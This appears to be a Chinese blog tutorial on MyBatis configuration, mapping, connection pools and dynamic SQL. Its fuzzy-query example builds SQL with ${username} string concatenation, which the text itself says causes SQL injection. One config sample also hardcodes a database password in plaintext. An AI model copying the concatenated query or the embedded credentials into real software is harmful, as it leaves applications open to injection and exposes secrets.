<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryAllUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select *from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>测试类</strong></p>
<blockquote>
<p>mybatis与jdbc一样，在实现crud操作时要去控制事务的提交commit</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建 session域工厂</span></span><br><span class="line">SqlSessionFactory sessionFactory =</span><br><span class="line">        <span class="keyword">new</span> SqlSessionFactoryBuilder().build(Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到SqlSession</span></span><br><span class="line">SqlSession sqlSession = sessionFactory.openSession();</span><br><span class="line"><span class="comment">//配置文件中读取</span></span><br><span class="line">List&lt;Object&gt; queryAllUser = sqlSession.selectList(<span class="string">&quot;queryAllUser&quot;</span>);</span><br><span class="line"></span><br><span class="line">queryAllUser.forEach(System.out::println);</span><br><span class="line">sqlSession.commit();</span><br><span class="line">sqlSession.close();</span><br></pre></td></tr></table></figure>

<h2 id="基于注解形式"><a href="#基于注解形式" class="headerlink" title="基于注解形式"></a>基于注解形式</h2><p><strong>mapper层</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUserDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">	<span class="function">List&lt;User&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>mybatis.conf</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 告知 mybatis 映射配置的位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;com.itheima.dao.IUserDao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="MyBatis设计模式"><a href="#MyBatis设计模式" class="headerlink" title="MyBatis设计模式"></a>MyBatis设计模式</h1><p>工厂模式</p>
<p>代理模式</p>
<p>建造者模式</p>
<h1 id="Mybatis-conf配置标签"><a href="#Mybatis-conf配置标签" class="headerlink" title="Mybatis.conf配置标签"></a>Mybatis.conf配置标签</h1><blockquote>
<p>存在顺序问题</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">-properties（属性）</span><br><span class="line">	--property</span><br><span class="line">-settings（全局配置参数）</span><br><span class="line">	--setting</span><br><span class="line">-typeAliases（类型别名）</span><br><span class="line">	--typeAliase</span><br><span class="line">	--package</span><br><span class="line">-typeHandlers（类型处理器）</span><br><span class="line">	-objectFactory（对象工厂）</span><br><span class="line">	-plugins（插件）</span><br><span class="line">-environments（环境集合属性对象）</span><br><span class="line">	--environment（环境子属性对象）</span><br><span class="line">		---transactionManager（事务管理）</span><br><span class="line">		---dataSource（数据源）</span><br><span class="line">-mappers（映射器）</span><br><span class="line">	--mapper</span><br><span class="line">	--package</span><br></pre></td></tr></table></figure>

<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><p>外部属性，这些属性都是可外部配置且可动态替换的，既可以在典型的 Java 属性文件中配置，亦可通过 properties 元素的子元素来传递</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一般用来给 environment 标签中的 dataSource 赋值</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="settings"><a href="#settings" class="headerlink" title="settings"></a>settings</h2><p>MyBatis 中极其重要的配置，它们会改变 MyBatis 的运行时行为。</p>
<p>settings 中配置有很多。这里介绍几个平常使用过程中比较重要的配置：</p>
<p>![MyBatis中Setting节点内容](<a href="http://qiniu.xiaoming.net.cn/myBatis">http://qiniu.xiaoming.net.cn/myBatis</a> setting节点内容.jpg)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="typeAliases"><a href="#typeAliases" class="headerlink" title="typeAliases"></a>typeAliases</h2><p>类型别名，类型别名是为 Java 类型设置的一个名字。它只和 XML 配置有关。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;typeAliases&gt;</span><br><span class="line">  &lt;typeAlias alias&#x3D;&quot;Blog&quot; type&#x3D;&quot;domain.blog.Blog&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;typeAliases&gt;</span><br></pre></td></tr></table></figure>

<p>当这样配置时，Blog 可以用在任何使用 <code>domain.blog.Blog</code> 的地方。</p>
<h2 id="typeHandlers"><a href="#typeHandlers" class="headerlink" title="typeHandlers"></a>typeHandlers</h2><p>类型处理器，无论是 MyBatis 在预处理语句（PreparedStatement）中设置一个参数时，还是从结果集中取出一个值时， 都会用类型处理器将获取的值以合适的方式转换成 Java 类型。</p>
<p>在 <code>org.apache.ibatis.type</code> 包下有很多已经实现好的 TypeHandler，可以参考如下:</p>
<p>![MyBatis 实现好的 TypeHandler](<a href="http://qiniu.xiaoming.net.cn/MyBatis%E5%AE%9E%E7%8E%B0%E5%A5%BD%E7%9A%84">http://qiniu.xiaoming.net.cn/MyBatis实现好的</a> TypeHandler.jpg)</p>
<p>可以重写类型处理器或创建自己的类型处理器来处理不支持的或非标准的类型。</p>
<p>具体做法为：实现 <code>org.apache.ibatis.type.TypeHandler</code> 接口， 或继承一个很方便的类 <code>org.apache.ibatis.type.BaseTypeHandler</code>， 然后可以选择性地将它映射到一个 JDBC 类型。</p>
<h2 id="objectFactory"><a href="#objectFactory" class="headerlink" title="objectFactory"></a>objectFactory</h2><p>对象工厂，MyBatis 每次创建结果对象的新实例时，它都会使用一个对象工厂（ObjectFactory）实例来完成。默认的对象工厂需要做的仅仅是实例化目标类，要么通过默认构造方法，要么在参数映射存在的时候通过参数构造方法来实例化。如果想覆盖对象工厂的默认行为，则可以通过创建自己的对象工厂来实现。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">public class ExampleObjectFactory extends DefaultObjectFactory &#123;</span><br><span class="line">  public Object create(Class type) &#123;</span><br><span class="line">    return super.create(type);</span><br><span class="line">  &#125;</span><br><span class="line">  public Object create(Class type, List<span class="tag">&lt;<span class="name">Class</span>&gt;</span> constructorArgTypes, List<span class="tag">&lt;<span class="name">Object</span>&gt;</span> constructorArgs) &#123;</span><br><span class="line">    return super.create(type, constructorArgTypes, constructorArgs);</span><br><span class="line">  &#125;</span><br><span class="line">  public void setProperties(Properties properties) &#123;</span><br><span class="line">    super.setProperties(properties);</span><br><span class="line">  &#125;</span><br><span class="line">  public <span class="tag">&lt;<span class="name">T</span>&gt;</span> boolean isCollection(Class<span class="tag">&lt;<span class="name">T</span>&gt;</span> type) &#123;</span><br><span class="line">    return Collection.class.isAssignableFrom(type);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后需要在 XML 中配置此对象工厂</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">objectFactory</span> <span class="attr">type</span>=<span class="string">&quot;org.mybatis.example.ExampleObjectFactory&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;someProperty&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">objectFactory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h2><p>插件开发，插件开发是 MyBatis 设计人员给开发人员留给自行开发的接口，MyBatis 允许在已映射语句执行过程中的某一点进行拦截调用。MyBatis 允许使用插件来拦截的方法调用包括：<code>Executor</code>、<code>ParameterHandler</code>、<code>ResultSetHandler</code>、<code>StatementHandler</code> 接口，这几个接口也是 MyBatis 中非常重要的接口。</p>
<h2 id="environments"><a href="#environments" class="headerlink" title="environments"></a>environments</h2><p>MyBatis 环境配置，MyBatis 可以配置成适应多种环境，这种机制有助于将 SQL 映射应用于多种数据库之中。例如，开发、测试和生产环境需要有不同的配置；或者想在具有相同 Schema 的多个生产数据库中使用相同的 SQL 映射。</p>
<p>这里注意一点，虽然 environments 可以指定多个环境，但是 SqlSessionFactory 只能有一个，为了指定创建哪种环境，只要将它作为可选的参数传递给 SqlSessionFactoryBuilder 即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment);</span><br><span class="line">SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, environment, properties);</span><br></pre></td></tr></table></figure>

<p>环境配置如下:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;...&quot;</span> <span class="attr">value</span>=<span class="string">&quot;...&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="databaseIdProvider"><a href="#databaseIdProvider" class="headerlink" title="databaseIdProvider"></a>databaseIdProvider</h2><p>数据库厂商标示，MyBatis 可以根据不同的数据库厂商执行不同的语句，这种多厂商的支持是基于映射语句中的 databaseId 属性。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">databaseIdProvider</span> <span class="attr">type</span>=<span class="string">&quot;DB_VENDOR&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;SQL Server&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sqlserver&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;DB2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;db2&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;Oracle&quot;</span> <span class="attr">value</span>=<span class="string">&quot;oracle&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">databaseIdProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="mappers"><a href="#mappers" class="headerlink" title="mappers"></a>mappers</h2><p>映射器，这是告诉 MyBatis 去哪里找到这些 SQL 语句，mappers 映射配置有四种方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用相对于类路径的资源引用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/AuthorMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/BlogMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/PostMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用完全限定资源定位符（URL） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/AuthorMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/BlogMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/PostMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用映射器接口实现类的完全限定类名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.AuthorMapper&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.BlogMapper&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.PostMapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 将包内的映射器接口实现全部注册为映射器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;org.mybatis.builder&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>









<h1 id="ParameterStatement"><a href="#ParameterStatement" class="headerlink" title="ParameterStatement"></a>ParameterStatement</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryOrdersByUserId&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">resultType</span>=<span class="string">&quot;dm.demo.project.pojo.Orders&quot;</span>&gt;</span></span><br><span class="line">        	select *from orders where user_id=#&#123;userid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ParameterType:代表参数的类型</li>
<li>resultType：代表返回结果集的类型</li>
<li>#{ ognl表达(对象.对象 ) }：代表占位符？，是用于执行语句时替换实际的数据</li>
</ul>
<h2 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h2><ul>
<li>java代码层次</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; users = userDao.findByName(<span class="string">&quot;%王%&quot;</span>);</span><br><span class="line"></span><br><span class="line">select * from user where username like #&#123;username&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在xml文件层次</li>
</ul>
<blockquote>
<p>${}:表示字符串拼接，不会做任何处理，会产生sql注入问题</p>
<p>#{}：如果参数是String，会自动加 ‘ ‘</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryByUserName&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">resultType</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span>&gt;</span></span><br><span class="line">        select *from user where username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="ResultType"><a href="#ResultType" class="headerlink" title="ResultType"></a>ResultType</h2><blockquote>
<p>resultType属性可以指定结果集的类型，它支持基本类型和实体类类型</p>
<p>未注册过类型别名，必须使用类的全限名</p>
<p>实体类中的属性名称必须与查询语句的列对齐，实现对结果集的封装</p>
</blockquote>
<p>pojo的字段要与结果集字段名一致</p>
<h2 id="ResultMap"><a href="#ResultMap" class="headerlink" title="ResultMap"></a>ResultMap</h2><blockquote>
<p>可以建立查询的列名和实体类的属性名称不一致时建立对应关系。从而实现封装</p>
</blockquote>
<p>column：用于指定数据库别名 </p>
<p>property: 用于指定实体类属性名称</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 	type 属性：指定实体类的全限定类名</span></span><br><span class="line"><span class="comment">		id 属性：给定一个唯一标识，是给查询 select 标签引用用的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.itheima.domain.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userId&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;username&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userName&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userSex&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;address&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userAddress&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;birthday&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userBirthday&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserAndOrdersLazyLoad&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">    select *from user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="连接池技术"><a href="#连接池技术" class="headerlink" title="连接池技术"></a>连接池技术</h1><p>而在 Mybatis 中也有连接池技术，但是它采用的是自己的连接池技术。在 Mybatis 的 mybatisconfig.xml 配置文件中，通过来实现 Mybatis 中连接池的配置。</p>
<p>分为三类：</p>
<ul>
<li>unpooled  不使用连接池的数据源</li>
<li>pooled       使用连接池的数据源</li>
<li>jndi             使用JNDI实现的数据源</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--            配置连接数据库的信息，用的是数据源(连接池)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/spring1?characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;86795462m&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Mybatis通过工厂模式来创建数据源DataSource对象。<code>DataSourceFactory</code>的<code>getDataSource</code></li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201222095657371.png" alt="image-20201222095657371"></p>
<ul>
<li>创建DataSource实例后，会将其放到Configuration对象内的Environment对象中</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201222095532182.png" alt="image-20201222095532182"></p>
<ul>
<li><p>当需要创建SqlSession对象并需要执行SQL语句时，MyBatis才会去调用dataSource对象来创建Connection对象。</p>
<p><img src="https://csn.damyoung.cn/image-20201222095707480.png" alt="image-20201222095707480"></p>
</li>
</ul>
<h1 id="事务控制"><a href="#事务控制" class="headerlink" title="事务控制"></a>事务控制</h1><blockquote>
<p>在JDBC中可以通过手动方式将事务提交改为手动方式，setAutoCommit()方法，true为自动提交</p>
<p>MyBatis框架是对JDBC封装，MyBatis的事务控制方式，本身通过其设置事务提交方式</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201222101652608.png" alt="image-20201222101652608"></p>
<h1 id="动态SQL"><a href="#动态SQL" class="headerlink" title="动态SQL"></a>动态SQL</h1><p>Mybatis 动态 sql 可以在 Xml 映射文件内，以标签的形式编写动态 sql，执行原理是根据表达式的值 完成逻辑判断并动态拼接 sql 的功能</p>
<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><blockquote>
<p>if-test</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;username!=null and username != &#x27;&#x27; &quot;</span>&gt;</span></span><br><span class="line">	and username like #&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="choose"><a href="#choose" class="headerlink" title="choose"></a>choose</h2><blockquote>
<p>choose-when-otherwise</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 此时接收的参数为一个对象 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectActiveBlogByTitleOrOther&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;Blog&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResultMap&quot;</span>&gt;</span></span><br><span class="line">    select * from blogs where featured=false</span><br><span class="line">    <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;title != null&quot;</span>&gt;</span></span><br><span class="line">            AND title =#&#123;title&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;authorId != null&quot;</span>&gt;</span></span><br><span class="line">            and author_id = #&#123;authorId&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">otherwise</span>&gt;</span></span><br><span class="line">            and id&gt;0</span><br><span class="line">        <span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="where"><a href="#where" class="headerlink" title="where"></a>where</h2><blockquote>
<p>希望where条件语句也在需要的时候才加入，可以使用<code>where</code>来进行判断</p>
</blockquote>
<p>where元素只会在至少有一个子元素的条件返回 SQL 子句的情况下才去插入“WHERE”子句。而且，<strong>若语句的开头为“AND”或“OR”，where元素也会将它们去除</strong></p>
